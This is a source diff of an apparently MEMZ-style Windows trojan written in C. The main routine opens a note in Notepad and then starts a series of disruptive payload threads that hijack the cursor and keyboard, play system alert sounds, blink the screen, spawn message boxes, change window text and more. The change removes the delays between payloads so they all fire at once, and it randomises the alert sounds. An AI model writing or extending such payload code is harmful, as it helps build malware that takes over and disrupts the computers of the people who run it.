@@ -382,31 +382,31 @@ void main() {
 	CloseHandle(note);
 	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
 
-	Sleep(30000);
+	//Sleep(30000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadExecute, NULL, NULL);
 
-	Sleep(40000);
+	//Sleep(40000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadCursor, NULL, NULL);
 
-	Sleep(20000);
+	//Sleep(20000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadKeyboard, NULL, NULL);
 
-	Sleep(60000);
+	//Sleep(60000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadSound, NULL, NULL);
 
-	Sleep(30000);
+	//Sleep(30000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadBlink, NULL, NULL);
 
-	Sleep(20000);
+	//Sleep(20000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
 
-	Sleep(40000);
+	//Sleep(40000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
 
-	Sleep(80000);
+	//Sleep(80000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadPIP, NULL, NULL);
 
-	Sleep(15000);
+	//Sleep(15000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadPuzzle, NULL, NULL);
 
 	for (;;) {
@@ -636,9 +636,15 @@ void enumerateChildren(HWND hwnd) {
 	}
 }
 
+char *sounds[] = {
+	"SystemHand",
+	"SystemQuestion",
+	"SystemExclamation"
+};
+
 int payloadSound(int times, int runtime) {
-	PlaySoundA("SystemHand", NULL, SND_ASYNC);
-	return 20 + (random() % 20);
+	PlaySoundA(sounds[random() % (sizeof(sounds) / sizeof(void*))], NULL, SND_ASYNC);
+	return 10 + (random() % 20);
 }
 
 int payloadPuzzle(int times, int runtime) {
